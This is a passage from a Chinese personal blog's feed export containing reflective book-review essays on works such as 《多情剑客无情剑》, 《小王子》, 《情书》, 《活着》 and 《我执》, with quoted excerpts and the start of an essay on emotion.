最不喜欢一个人吃饭。在赶小说的过程中偶尔和几个小说中的原型吃饭，最后都是对着窗外的冬天，喝一口燕京纯生，感叹“人生苦短，还是喜欢干点什么就趁早干点什么” “灯市口大街北边有个打折书店，新书堆着卖，跟冬储大白菜似的，汗牛冲栋，从地板一直瘀到屋顶，王小波的全套四大本文集才卖二十元。当时一个恍惚，如五雷轰顶，信心顿失，这里面多少垃圾呀？五百年后有多少书还有人读呀？在这种认识下，要多大的牛逼和多大的自大狂才能撅着屁股写成十几万字，然后印在干干净净的白纸上，糟践好些用来制造白纸的树木和花花草草。想起那个日本鬼才芥川龙之介，怀疑自己能力的时候就打开阁楼的窗户，向着虚空，大声叫喊：“我是天才。”最后还是没用，三十五岁服了安眠药死掉。” “桃花落尽子满枝”，过去操场上领操的校花，如今正考虑什么时候破坏国家政策生第二胎，要不要自己开个幼儿园。何苦打着记录生命经验的旗号，再意淫人家一遍？” “于是热烈地盼望再有几个长假，把我不能不落在纸上的东西写完。写完了，心里面就该空荡荡的什么都没有了吧？再见老相好也能心如古井水，没有一丝波澜。于是热烈地盼望着没有写作冲动的那一天，然后就号称自己尘务经心，天分有限，一个字也不写了，就像热烈地盼望着阳痿的到来。 野史说，江淹才尽后，过着吃喝嫖赌抽坑蒙拐骗偷的幸福生活。我愿意相信。”]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[多情剑客无情剑]]></title>
    <url>%2Fmind%2F160825WeaponAndWoman%2F</url>
    <content type="text"><![CDATA[这是我人生中第一本武侠小说，据说这也是古龙先生的巅峰之作，只因为在知乎上有人提到看古龙先生的作品千万别从《多情剑客无情剑》看起，因为曾经沧海难为水，再看其他的就显得干燥无味了，于是，便有了这一篇读后感。 “冷风如刀，以大地为砧板，视众生为鱼肉。万里飞雪，将苍穹作烘炉，溶万物为白银。”冷风，飞雪是大地上苍穹下恒久的寂寞，众生，万物皆被寂寞宰杀，犹如鱼肉之于刀俎，无可奈何，不曾停歇。长文以此为始，我猜想这定是个骨子里透着悲伤的人在说一个悲伤的故事，故事里有一个寂寞的主角，在苍茫大地上漂泊，用生命诠释着寂寞。“世上太多烦恼，岂非是因为笑得太少？笑，就像是香水，不但能令自己芬芳，也能令别人快乐。你若令别人一笑，纵然做做愚蠢的是又何妨？”直到看到了文章的结尾，才知寂寞因真情而起，却也终因真情而得以排解。 小李探花李寻欢十数年前抛弃所爱之人，故乡，名利，出关漂泊，只留下鼎鼎大名在关中流传——“小李飞刀，例不虚发”。他舍弃了自己的本心，情愿自我折磨以成全好友龙啸云对林诗音的爱，这是古龙先生对他的大侠设定，我也因此对之有所钦佩，只是令我疑惑的是，时隔多年，林诗音与龙啸云已然成家生子，美满和谐，李寻欢归来，竟不怕徒生波折，多年苦心付诸东流？掩卷思之，唉，毕竟凡人。一走了之自然干脆利落，只是后来，痛苦从没停止。他可以成全重义轻色作为侠客的自己，却始终无法抹煞灵魂深处对于林诗音不曾停过的思念。十多年来，每一刀所刻画出的她脸庞上的线条，每一个刻成的眉眼熟悉的她，每一个埋下的她，都是他试图淡忘的努力，只是有些女人就像长在男人心底的朱砂痣，时间越久，盛开得越是红火，越是鲜艳，比如，李寻欢心中的林诗音，又或者，自己心中的那个她。我相信爱情能让人忘记时间，但是深情如他，时间，即便是十年之久的光阴，都无法让他忘掉哪怕一点点的细节，她在他的心中，在他的刀下，只是越来越清晰，越来越和那个青梅竹马的女孩重合。 每当我想着那样一把随时可能悄无声息的以迅雷不及掩耳之速射出，没入喉管，饮满鲜血的冰冷的刀，在一个历经折磨，沧桑却不改深情的男人手中一点点勾勒出他最爱的女人的模样时，许多情绪便接连涌出，感动，无奈，悲伤，厌恶，嘲讽……他们形状各异，却各有缘由，细看之下每一样都能让我透不过气，每一项都在折射着作为人的悲哀。 李寻欢啊，你爱的是林诗音吗？还是其他的什么？你是真的爱吗？你说是，那为什么会有当初的放弃呢？呵呵，你只替自己想过吧。爱情可以转让吗？合适吗？值得吗？过去也都罢了，那么如今呢，归来何用？怎就看不破。 其实也不怪你，你太寂寞了。这样一个不犯佳人，不负美酒的有能耐的男人，这样一个天下敬仰，才情横溢的有魅力的男人，这样一个少年成名，义薄云天的有质量的男人，自然需要些不可自拔的东西来消费自己，耗散人生，比如深情，比如幻想。 后来有了小红，于是幻想放在一旁，随她去吧。毕竟过去的已经过去了。这是多么深刻的真理啊，足以慰藉这十年一梦的荒唐了。 自然，你是小李飞刀，你可以为随便一个你以为可以是兄弟的人放弃，销毁一个你深爱也爱你不浅的女人和她的豆蔻年华，甚至她的漫漫人生，你可以亲手舍弃真心而沉浸在十年一日的自我折磨中，你可以情不自禁地归来，无辜任性地破坏，自作自受的痛苦，我不适，我不悦，但我不怪，因为我知道，这不只是因为你是小李飞刀，更因为你首先是一个人。感情之于人，就是这样的虚伪和荒唐，矛盾与悲哀。 剑客是人，剑是人生，多情的人，无情的人生啊！ 阿飞，阿飞，你终于还是成了李寻欢，你比他有过之而无不及。或许，你不该遇上他的。 你本是纵横荒野，睥睨天地的万兽之王，只是如今，竟也被这鲜美皮囊，花言巧语，假意虚行困在牢笼里。我不怪林仙儿，她或许淫荡，或许邪恶，但也或许，或许真的爱你。只是恨你，你怎就动了爱的念头呢？你喝不起酒，难道自觉地爱得起吗？你看，忘了当初了吧。回头看，你曾是多么的睿智和明白啊。如今呢，你简直已被毁了。我为你感到心痛，但也明白，你若没这一遭，大概人生也显得有些无趣了。前面那些年的痛苦和煎熬，没了后面的堕落与荒谬，倒也显得苍白无用了。 这几日，阿飞数院里梅花的场景常常浮现在我脑海里，说实话，我是有些羡慕的。虽然我没有那么快的剑，没有那样敏锐的身体和大脑，没有冰天雪地般恶劣的成长环境，没有享受过林仙儿般的温存，没有体验过，透入骨髓的寂寞，但是我也有浪荡江湖的渴望，偶遇佳人的企盼，长相厮守的梦想，还有，还有，执迷不悟的少年心。 我为阿飞扼腕，并假想如果我是他，我一定能够敏感地一早识破林仙儿的谁都可以，流氓般地可以了那谁都可以的林仙儿，然后抛弃她，找回自己，再然后，仗剑天涯，让世人都惊畏那把像玩具的刀。我为李寻欢叹息，并假想如果我是他，一定不会让龙啸云和林诗音升温，更不可能让步远走，因为那是我爱的，无论是谁，什么理由，都不可能拿走，更何况，我是李寻欢，例不虚发的小李飞刀。我会爱她，好好爱，用全部爱，会陪她看每一年的红梅，而不是守着红梅想她如今的样子。 我想的很好，很周到，独独忘了一点，我不是阿飞，我不是李寻欢，而且，如果我成了他们，他们也就不再是他们了。 无论是阿飞，还是小李探花，他们都是大侠，有着大侠的格局，而我只是个小人物，死守着小人物应有的格局。在我的生活里，没有动辄夺命的强大，只有任人鱼肉的弱小，没有仗剑独行的潇洒，只有乌合于众的无奈，没有挥霍一切的资本，只有救赎不完的责任。我看着自己在这十丈软红里醉生梦死，想要呼喊，想要咆哮，却发不出什么声音。 虽然对这一切感到绝望，但是至少，我还能够想热爱便热爱，想受伤便受伤，也算是生活给的最后的出路吧。 读些武侠，算是对这生存以上生活以下的现状的一丝反抗吧。看那些故事里的人在岁月中进进出出，笑笑哭哭，我也能佯装通透地陪着叹声“梦中不知身是客，一晌贪欢”。无论如何，我希望阿飞，李寻欢，或者我自己，都能找到自己，活好一次。]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[小王子]]></title>
    <url>%2Fmind%2F160806Prince%2F</url>
    <content type="text"><![CDATA[小王子终要长大素闻大名，今日得见，这童话，确只有大人能读懂。悲哀的是，看懂的大人们只能苦笑，醒悟过来了却立马又为醒悟本身觉得不好意思，骚情一些的还会感到失落无奈呢，好比秒懂黄色笑话带来的尴尬，所幸四下无人，我也便笑笑不说话。 故事背景预设颇为离奇，亦真亦幻，主人公遇见小王子，然后转述小王子对他说的故事，于是，鞭笞大人们的皮鞭开始一下一下地落下去。 小王子来自异星球，有一朵傲娇的花，两座可以做饭的活火山，一座可以当做座椅的死火山，火山们必须常常被清理，猴面包树的小苗子也是。然而小王子对一些无关紧要的话看的太认真，结果使自己很苦恼，也因此和心爱的花闹了别扭，于是他决定去拜访其他星球，找点事做，学习学习。以下是他依次拜访的行星。 第一个星球上有一个国王，热衷于荒唐的权利，发布着可笑的命令，自以为能令行天下，实则只是自然的傀儡，狐假虎威，无所作为，通过号称占有整个宇宙来获得快感却甚至从未视差走访过所谓的辖区，不知是否是我多虑，暗中所指恐怕政治性不当。 第二个星球上是一个爱虚荣的人，他的人生只看到虚无的荣耀，再无其他。 第三个，酒鬼，沉浸在回忆中无法自拔，为为喝酒而羞愧，为忘却羞愧而喝酒。 第四个，实业家，暗讽了资本家的荒谬，虚无的占有。 第五个，点灯人，对生活节奏加快的夸张表述和反思，对成为牺牲品的劳苦大众的尊敬和怜悯，对民智不开的无奈。在这里日子过得快，小王子爱的却是每小时1440次的落日。 第六个，地理学家，让我猜猜看，说的是学者的闭门造车，古板生硬吧，还妄图要写永恒的东西，那么小王子便问了，什么是短暂？ 第七个，地球。蛇告诉他，在人群中你一样会孤独。三枚花瓣的小花说人类在风中飘来飘去，没有根是他们最大的不便。狐狸当了小三，和小王子谈了一场文艺青年之间的恋爱。扳道工说开车人也不知道要去哪里。卖止渴药的商人也蛮有意思。然后是分别，就好像剥落旧树皮一样，旧树皮并没有什么可悲的。 私以为，这样荒诞而模棱两可的文字最值得捉摸感慨，最是意味深长，也最可解释，因此最容易反映一个人内心的阴暗程度，一千个人有一千个黄色笑话，无怪乎闻名遐迩，只是其中用心，懂又如何，不懂又如何，微弱的呼唤并不足以阻挡时代轰隆隆滚动前进着的巨轮，毕竟开列车的人也不知道要去哪里，毕竟我也已经自测心里脏的很呢。所以，这时代，大可以出轨翻车，一了百了，停下是万万不能的，毕竟，远处还有孩子们想要的布娃娃呢。 附上摘抄:《小王子》摘抄:1.小孩子们对大人们应该宽厚些，不要埋怨他们。 2.忘记一个朋友，这太叫人悲伤了。并不是所有的人都有过一个朋友。 3.再说，我也可能变成那些大人那样，只对数字感兴趣。 4.我大概有点和大人们差不多。我一定是变老了。 5.有时候，人们把自己的工作推到以后去做，并没有什么妨害，但要遇到拔猴面包树苗这种事，那就非造成大灾难不可。 “一天，我看见过四十三次日落。”过一会儿，你又说：“你知道，当人们感到非常苦闷时，总是喜欢日落的。”“一天四十三次，你怎么会这么苦闷？”小王子没有回答。 7.“你说话就和那些大人一样！”这话使我有点难堪。可是他又尖刻无情地说道：“你什么都分不清…你把什么都混在一起！” 8.小王子对一些无关紧要的话看得太认真，结果使自己很苦恼。 9.“我那时什么也不懂！我应该根据她的行为，而不是根据她的话来判断她。她使我的生活芬芳多彩，我真不该离开她跑出来。我本应该猜出在她那令人爱怜的花招后面所隐藏的温情。花是多么自相矛盾！我当时太年青，还不懂得爱她。” “我要是想认识蝴蝶，经不起两三只尺蠖是不行的。 11.国王接着说，“向每个人提出的要求应该是他们所能做到的。权威首先应该建立在理性的基础上。 12.一旦他提出了一个问题，是从来也不会放弃的。 13.地球可不是一颗普通的行星！它上面有一百一十一个国王（当然，没有漏掉黑人国王），七千个地理学家，九十万个实业家，七百五十万个酒鬼，三亿一千一百万个爱虚荣的人。 14.到了有人的地方，你一样孤独。蛇对小王子说。 15.花评价人，他们没有根，风吹着他们到处跑，这对他们是很不方便的。 16.“你们是什么人？”小王子问。“你们是什么人…你们是什么人…你们是什么人…”回音又回答道。“请你们做我的朋友吧，我很孤独。”他说。“我很孤独…我很孤独…我很孤独…”回音又回答着。小王子想道：“这颗行星真奇怪！它上面全是干巴巴的，而且又尖利又咸涩，人们一点想象力都没有。他们只是重复别人对他们说的话…在我的家乡，我有一朵花。她总是自己先说话… 17.“我还以为我有一朵独一无二的花呢，我有的仅是一朵普通的花。这朵花，再加上三座只有我膝盖那么高的火山，而且其中一座还可能是永远熄灭了的，这一切不会使我成为一个了不起的王子…”于是，他躺在草丛中哭泣起来。 18.驯服就是建立联系。对我来说，你还只是一个小男孩，就像其他千万个小男孩一样。我不需要你。你也同样用不着我。对你来说，我也不过是一只狐狸，和其他千万只狐狸一样。但是，如果你驯服了我，我们就互相不可缺少了。对我来说，你就是世界上唯一的了；我对你来说，也是世界上唯一的了。”“我有点明白了。”小王子说，“有一朵花…，我想，她把我驯服了…” 19.驯服，仪式，都是早已被人忘却的事情了。 20.这就是你的过错，我本来并不想给你带来任何痛苦，可你却要我驯服你。 21.只有用心才能看见实质性的东西。用眼睛是看不见的。眼睛是什么也看不见的，应该用心去寻找。 22.你要对你驯服过的一切负责到底。 26.人们已经忘记了这个道理，可你不该忘记它。 27.你也渴吗？水对心也是有益处的。 28.是的，无论是房子，星星，或是沙漠，使它们美丽的东西是看不见的！” 29.我想起了狐狸的话，如果被人驯服了，就可能会要哭的…… 30.我很高兴，你找到了你的机器所缺少的东西，很快你就可以回家去了。 31.这就好象我并没有给你星星，而是给你一大堆会笑出声来的小铃铛…” 32.但是，这就好像剥落的旧树皮一样。旧树皮，并没有什么可悲的。 33.这时，他也沉默了，因为他在哭。 34.那些人们啊，他们往快车里拥挤，但是他们却不知道要寻找什么。于是，他们就忙忙碌碌，来回转圈子…”小王子说道。他接着又说:“这没有必要…” 35.他们真匆忙呀，”小王子说，“他们要寻找什么？”“开机车的人自己也不知道。”扳道工说道。于是，第二列灯火通明的快车又朝着相反的方向轰隆轰隆地开过去。“他们怎么又回来了呢？”小王子问道。“他们不是原来那些人了。”扳道工说，“这是一次对开列车。”“他们不满意他们原来所住的地方吗？”“人们是从来也不会满意自己所在的地方的。”扳道工说。此时，第三趟灯火明亮的快车又隆隆而过。“他们是在追随第一批旅客吗？”小王子问道。“他们什么也不追随。”扳道工说，“他们在里面睡觉，或是在打哈欠。只有孩子们把鼻子贴在玻璃窗上往外看。”“只有孩子知道他们自己在寻找什么。”小王子说，“他们为一个布娃娃花费不少时间，这个布娃娃就成了很重要的东西，如果有人夺走的他们的布娃娃，他们就哭泣…”“他们真幸运。”扳道工说。]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[情书]]></title>
    <url>%2Fmind%2F160806LoveLetter%2F</url>
    <content type="text"><![CDATA[高中时代看一个样貌清秀女孩手捧《情书》在窗边读 ，阳光泻在侧脸，长发如瀑，双肩瘦削，领口的脖颈肤白胜雪，画面太美，不敢多看。然而还是一眼望尽，也立刻记住了岩井俊二这个古怪的日本名字。当时我想，这名字看似逼格颇高，有空我也得读读才成。然而好长一段时间里，再没记起那个场景，今日不知怎的，忽然忆起，打算一读《情书》，权当消磨这心乱如麻的午后。 剧透的序最惹人厌，读罢整个故事便十分了然，他日我若为人作序，定只说破三分，留七分光景予人想往。看得见结局的开头会败了整个故事的兴味，就像一眼瞧得到头的人生并无多大活头。 缘起在于一男一女的藤井树，他们是中学同学，因为同名同姓的缘故受同学撮合，女方无甚感觉，而作为“闷蛋”的男方却有些入戏。自然像大多年少的故事一样，这份奇特的缘分无疾而终。可他是足够幸运的，多年后遇上了和女藤井树样貌相似度颇高的博子并且几乎要步入婚姻的殿堂。然而人生诸多时候就是差那么一点点，即便耗尽所有运气也无力回天，男藤井树在婚前的一次登山中意外身亡。三年后博子又将和玻璃匠茂成婚。婚前误将女藤井树的住址当做男藤井树生前住址，与女藤井树有了几次的书信来往，一点点揭开了尘封往事。 男藤井树是一个看历史和哲学以及《追忆似水年华》的人们眼中古怪的人和女藤井树眼中的“闷蛋”。他无意之中一点点堕入自己编织的情网，后来又悄无声息毅然决然地离开，明面上是对老师同学的“误会”的反抗，实则我料想大概是受不得日复一日的自我煎熬，企图用骄傲的离开换一个从容的背影，用潇洒的远去掩住慌乱的眼神。然而他万万没有料到的是那些闷着的日子里出现过的阳光早已给他的人生打下了不可磨灭的水印，以至于后来的人那样像是从前的替代品，这是一种不负责任的自私，却也是令人动容的真情，值得理解的荒唐。令我愉快的是故事并没有这样走向结局，我很赞同作者，再度离开才是他最好的归宿。 女藤井树不属于他，博子同样不属于，或许，他和松田圣子比较好一些，毕竟最后的时间里，他没有想到自己的未婚妻博子，甚至也没有想到女藤井树，他只是唱着松田圣子的“我的爱随南风而逝…”，然后告别了这个世界。他的心中，只剩下求不得的苦。这让我不禁想起李宗盛的《山丘》——向情爱的挑逗，命运的左右，不自量力地还手，直至死方休。真是无比真实而残忍的写照。故事的最后，《追忆似水年华》戏剧般地被女藤井树捧在手中，阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。于男藤井树而言，也算是人生有个圆满的交代，死也值了。 对比之下，博子的境遇就有些糟糕。毕竟无论于谁，被当做替代品都是对于已经付出的感情的莫大羞辱，也是对于多年念念不忘的真心的无情嘲讽。颇有些“越过山丘，才发现无人等候”的苦楚。然而那又如何，时过境迁，一切都不得不被原谅，怪不得谁，你有心，我也曾愿意。还好生活留给她一个瓦，因害怕失去而如履薄冰地爱着她的瓦。 这样看来就形成了一个古怪的关系链。真情的瓦爱着对另一个男人念念不忘的博子，痴情的博子无法放下只是将对另一个女人的真心寄托在她身上的男藤井树。女藤井树时隔多年才明白当初那个男孩的炽热，而男孩已经不再，博子事过境迁才了然那个男人的炽热并不为她，而她已无可诉说。博子终将嫁给瓦，生活也终于将所有人糟蹋。 哈哈，不能原谅却无法阻挡，谁在你心里放冷枪。 事情常常是这样，一点也抵不过命运的作弄。然而，多年后的一封情书——“阿树，你好吗？我很好”足以无声消融一切。我们终于不再贪恋，不再妒忌，不再感伤，而是相互拥抱，渡过这冰冷的寂寞河流，杀死这刺骨的孤独时光。 这书短的离奇，看上去停的有些不是时候。我都怀疑自己是不是找到了不全的，可是转念想想，很多事不都这样，在最以为要高潮迭起的时候戛然而止，在最应当细水长流的时候无声湮灭，也许要抱怨生活，也许生活也会无辜地摊开双手，说，你瞧，我什么也没做，都是你们在作啊。 2015.11.18附上摘抄:《情书》摘抄1.我不知道为什么他这样做，他大概是个闷蛋，无所事事。 2.她的经历，虽然当时很不愉快，十年后看来，很有趣。 3.”他跌下去后，我尽全力去找他。”熊山开始高歌：”我的爱随南风而逝……””这是你们攀山者常唱的歌？”博子问。这是松田圣子的歌。”我相信当阿树敞在石下时还唱着这首歌。我听得到。”熊山说。 “也许阿树当时只是想着松田圣子。”博子耸一耸肩。博子和茂决定在熊山的家过夜。 4.妈很愤怒。”你还记得我丈夫怎死的？他患肺炎，那是冬天，是你背他到医院的。太迟了，上次你用了45分钟。我们要等救护车。””我只用了30分钟。”爷爷坚持：”事实上只28分钟，便到了入口。我今晚会再做得到。”当爷爷背起树时，妈挡着门口。”看，阿树是你的女儿，今晚由你决定。你选择怎做？”她知道怎么也阻不了他，所以决定让爷爷去了。风雪越下越大，爷爷背着树，踏过厚雪。他已是七十五岁了，但还很强健。半路中途，他摔倒了，面庞直倒在雪上。”你要休息一下了。”妈说。”不！我们继续！”他们花了四十分钟赶到医院，爷爷明显也要医治。医生给他一点氧气。阿树则暂时脱离危险。 5.茂走前几步用手围着嘴巴，叫声响遍冬日早晨：”藤井树，你‥冷‥吗？你还‥唱着‥松田圣子的歌吗？我要‥跟博子‥结婚呀！好‥好‥好！”他回头看博子。”看见吗？阿树祝福我们！”博子微笑。她想着对阿树说什么。面对着雪山，她大叫：”阿树，你好吗？我很好‥”不知什么缘故，在病榻上的阿树似听见博子，并轻轻唤道：”我很好。””阿树！你‥好‥吗？我‥很‥好！”博子跪在雪上，控制不了。第一次，她感到自在，她可以让阿树离开了。 6.当我在那个星期后回到学校，人们说你的阿树已经一声不响的转了校。那次就是我最后听见他的消息。 7.阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。 8.那本书，叫做《回忆似水年华》]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[活着]]></title>
    <url>%2Fmind%2F160806Living%2F</url>
    <content type="text"><![CDATA[指归夜话乙未年丙戌月己巳日，晨起气虚，身疲心乱，惶惶然不知所之。远黛无言，吾凝眸自语，生而今六千四百日有余，竟不自知。吾常囿于心，或无名之哀，或自傲之觞，或悲怜之恸，或若失之沮，悉不得自已。情不意而卒起，辗转难消，弥而复兴，实不可脱。其必天使惘也，吾岂愿哉？日四食，麑裘葛衣，群居终日，言不及义，语不由心，周而复始，乐此不疲，此吾所见众人之态也，某异其司空见惯，无以为奇。 某少伶俐，敏于思而巧于言，且样貌清秀，向为乡党殊爱，亦备称大父修德之功。然吾不以为意，尽日悠游，不齿于众小儿斗鸡走狗之态。吾自况于天使，所忧所乐亦必在天地。久之，吾欲无言。忧之弥重，乐之益薄，是故吾常有不喜不忧亦喜亦忧之状，人以为怪，渐远之。某愈无言，自得其乐。天地体大，所忧甚于所乐者远矣，吾遂长忧寡乐，以至于今。吾不知生而何由，逝而何往，孑然蹒跚，草草何益。吾不忍强食弱肉，人为情缚，同室操戈，苍生刍狗。吾不解天地不仁，大道出否，民智不开，其可哀乎。吾不悦，吾不愿，吾不屈，吾不自欺，吾不语人，吾不畏穷，戚戚然乎吾不可奈何。及至祖考坐化，情状愈烈，昔忧发于心，此情伤乎神。某昼不言，夜不语，魂不宁，魄不居，寐中数觉，凭窗望月，千古万人，踽踽如斯。噫，何足叹兮？何足道兮？ 某素闻《活着》系仁义之言，今幸拜读，深受其诲，奉为指归之作，遂欲秉烛夜话，发二三言，以消胸中块垒。 徐家有子，名唤福贵，因家境殷实，嫖赌成性，娶妻家珍，生女凤霞，育子有庆。其性随父，不务正业，好赌，负于龙二，败尽家财，房、地易主，遂家道中落，命途陡转。旋即其父作古，悲曲始奏。福贵租地自耕，聊以糊口，家奴辞尽，长根行乞。后因母病赴城求医，见征为壮丁，随军北上，九死一生，二三年间，战火纷飞，故土遥遥，生死不料。国军兵败，其为共军所虏，幸归故里，母已身故，未及送别，女病致哑，悲不自胜。幸家有脊梁，希望犹在。俄而有庆献血，枯涸而亡，父筑子坟，其可哀也。后王二喜妻凤霞，凤霞怀苦根，产后出血而亡，其母悲恸，不久卒命。苦根聪颖，香火得续，希望犹在。继而王二喜工伤弃世，家余老幼，福贵苦根，相依为命。居数年，苦根饱食豆子，腹胀而夭。此间之福贵，生无可恋，死无挂碍，希冀无存，心如死水。福贵后购一牛，亦谓福贵，两病残之躯，老而不亡，又享十数年寿。境遇如斯，恐无更甚，字字泣血，我心伤悲。 人生天地间，犹白驹过隙，忽然而已。虽寿夭有别，贵贱不一，然则终期于尽，具归抔土。以是自问，生而何用？掩卷怅然，或得之矣，盖无用乎。生，人之所以生者；死，人之所以死者。死生虽大，亦应随化，生则不必远逐，知足而安；老则顺天应时，向死而生；死则鼓盆而歌，忘我如寐。吾实不知，如此足乎？ 福贵之难，可谓时也，运也，命也。时逢新陈之交，改朝换代，上位易主，黎民食苦。运乃祸不单行，屋漏夜雨，一波三折，缘悭命蹇。吾不知命，且不妄言。此故事也，强言时、运不可怪也。吾曹苟欲鉴古为今，何其难也。当世之人鲜知当世之时，当事之人难断当事之运，况凡人不可悉命。故曰:吾属皆为时、运、命所虏，无一得脱，诚可哀也。使福贵举家赴死，于国有损乎？有益乎？吾等皆福贵之属也，于时势不可尽无，亦不必有，实神鬼之木偶，肉食者之脍具。 是故为人，实则为器，或问天下，或撷梨花，其何异之有？惟不失本心。福贵虽穷且困，不为非歹，知恩重义，纵死不辜。此其所以笑谈旧痛而无愧无伤，亦其妻所以死而瞑目也。吾知之也，人之于世，不求有为，但得无愧。 福贵已已，某值少年，不喜游荡，不好掘藏，乐作和尚，何为其然也？吾不知。吾且无言，且诗且酒趁年华，且行且赏且由他。]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[我执]]></title>
    <url>%2Fmind%2F160806HoldMyself%2F</url>
    <content type="text"><![CDATA[非其境者，不能摄受。从来如此。我想早迟是应当再读的。当下且先给这等待潮水抹煞的脚印留些描述，就算大家都不曾抑或不屑了解，无意甚或相约遗忘，我也舍不得抛弃那嚣张而可爱的姿态，忘不得他自顾自占领整个海岸，企图在天黑前包围大海的决心。 “我都知道了；这一切谎言与妄想，卑鄙与怯懦。它们就像颜料和素材，正好可以涂抹出一整座城市，以及其中无数的场景和遭遇。” 这写在《我执》的开始。似乎已得了看破妄想，舍得执着的大义。当看完全书，只是感慨差了些，凡成不得释迦都差了些。什么都不明白的最舒服，明了得多了，渐生出失望，更多一些，又有了希望，再多一些，就不望了，大概是明白了希望也是假的又不好意思说破。安静地忧郁着，理智地哀伤着，我看这是人世最真且爽的状态了。每个时代都有人前赴后继地奔跑着，他们不愿意追随前人，或者看着左边跑向右边，后来他们往往衣衫褴褛，白发苍苍，在街角迷了路。最后的最后，终究无法带着年轻身躯到达那看不见的城市的一群老汉在一座不知名城池破旧残败的墙根下看着布衣单剑，策马扬鞭，身无分文，却孤勇朝天的少年舍弃所有，义无反顾。咦，这画面有些熟悉，那一日到如今估摸着有一个甲子的光景了吧。当然也有一两个，早早不再怒吼咆哮，甚至不再窃窃低语，全心全意地做这美丽世界的美丽孤儿，智慧地笑对还在问“为什么”或者还在问“为什么还在问为什么”的孩子们。我虽然说不清那笑容里的成分，不过，我也知道了一些，这是谍中谍，这一场忙活，干的不是脚力，是心力。 一向觉得，知道的多的，说的少，说的多的，知道的少。而我等半懂不懂，想知难知的便整日哼哼唧唧，连做梦都免不得呓语一番，好像说得圆润些了也能悟得通透些一样。 其实我看这日记一样的文章，也有点像梦话，像是浮生一梦里的碎碎念。偶尔聪明，偶尔糊涂，偶尔拨云，偶尔雷霆，实在没有什么十分高明之处。若说高明，也许在更清楚的逻辑与更能写心之所想的文笔吧。你很精当地说出了我久郁于心的苦涩，使我仿佛得到春风化雨般的解脱，我便有些喜欢你了。然而许多人不明白，春雨的滋润过后还有炎夏的酷热，悲秋的萧索，寒冬的肃杀，以及年复一年轮回的煎熬。他们只是诧异，我曾心旷神怡，清明开悟，如今这又是怎么了呢？是啊，怎么了呢，令你开悟的人也不懂吧。 一般而言，散文集应该是不适合一口气看完，闲暇时翻翻，偶遇一两句动心之语更享受一些。然而我在不知道它是散文集的情况下懵懵懂懂一口气读完，倒也有了些更全局性的了解。虽然不了解背景，但我臆测作者似乎怀着情伤写的文字。开始还有所克制，反倒悟出些情场警语，摸索出些与《爱经》相契合的感悟，到了最后夜行如鬼的片段，深藏着的不安，彷徨，矛盾，痛苦一一浮现，作者带着年少时便有的叛逆，让我惊叹这行走在时间边缘的伟大勇气和竭力对抗桎梏的不凡探索。虽是散文集，内在的思想性态与思维模式却一脉相承，企图觉醒的波浪一阵高过一阵，在最后达到了令我瞠目结舌的高潮，更为奇异的是，这个过程平静的有些古怪，带着一种自残式的冷漠，仿佛看到白炽灯下作者鲜红的嘴角挂着的狞笑。这令许多人不寒而栗，但我会和他一起笑，割下自己的肉，就像割他的一样。我很欣赏这一丝冷漠带来的安慰，这令我觉得没有白花时间读他。 “你所见到的，只不过是自己的想象；你以为是自己的，只不过是种偶然。握得越紧越是徒然。此之谓我执。” 这是作者取自小乘佛法的感悟，但就通篇看来，也只是感悟感悟罢了。然而，即便如此也没有什么好苛求的，毕竟本不该奢望什么曲径通幽。相反的，倒应当感谢最后的一丝不透彻，如若没了它，我等也就欣赏不到另一个灵魂的垂死挣扎，辜负其自我解剖以供展览的好意，更演砸了作者精心编排的剧目。 归根结底，所谓我执，痛苦时才会寻求摆脱。对芸芸众生而言，这只是偶尔的跃迁，不可能成为常态的。用心看看，用心谢谢，用心笑笑，接着用心苟活就好了。当然，这是一些人对另一些人说的，但说话者本身才不会真正去做的，他们要挑战，像作者一样，挑战一切不可战胜的，质疑所有广泛认同的，拒绝全部理所当然的，赶在天黑之前，包围大海。 站在愚鲁者的角度，我有充分的理由把这当做一纸与命运妥协的契约，上面沾满了年少的鲜血和岁月的风尘，当不甘渐渐消弭，他将这良民证高高举过头顶，“你们看，我输了”。于是我们唏嘘感叹，又默默藏好自己的。 回过头来，我执是一切生产力的根本。虽然是自己抓着自己，想松开却是不易的，也是不舍得。我执是不可以大规模扼杀的，从这点上看，我王地狱不空誓不成佛的念想也令我有些疑惑。]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于情感]]></title>
    <url>%2Fmind%2F160606LoveAndLife%2F</url>
    <content type="text"><![CDATA[自古逢秋悲寂寥，我言年年有今朝我总是怀疑，那些我们曾经或依然念念不忘的是否真的在某一日终有回响？ 我想自己还是太过年轻，年轻到不足以谈论起情感这样一个宏大复杂的话题。但我也渐渐明白，一个人在每个人生阶段的想法对自己而言都是独一无二且至关重要的，无论这种想法回头看时会显得多么自以为是甚至荒唐可笑。实际上两个人没理由也没立场去互相褒贬指摘对方的想法，不同阶段的同一个人也是。不能两次踏进同一条河，也不能一次踏进两条河里，所谓醒来可能是另一个梦，所谓死去或许是回到故乡，所谓成长有些像是幻想，所谓理解大概只是妥协。当有天，你和从前的你四目相对，互不相识，你们谈论起理想与人生，幸福与意义，存在与追求，你们谈论的，好像不再是同一回事，于是，你们苦笑摇头，错身而过。在这之后的某个午夜忽然醒来后的一两个刹那里，你不知何时何地，再两个刹那，你就明白了自己究竟有多孤独。 从远古走来，人类一直孤独，也一直寻求解药，但并不能真正改变什么。深埋在简陋灵魂下的孤独基因并没有在红灯绿酒，歌舞升平的摩登时代里有丝毫消减，相反地，大有愈演愈烈的趋势。酒色财气，声色货利对当代人精神领域的鲸吞蚕食大大提高了人们对于快感刺激的阈值。我们越来越不能被满足，越来越挑剔和脆弱，表面快要溢出的热情无法掩盖内心滴水成冰的冷漠。真挚的感情渐渐成了对人生奢侈的期待，全球在一点点变冷。 情感大概有友情亲情和爱情，它们有所不同，但我没有足够的智慧来给出明确的界定，因此也就囫囵谈谈。 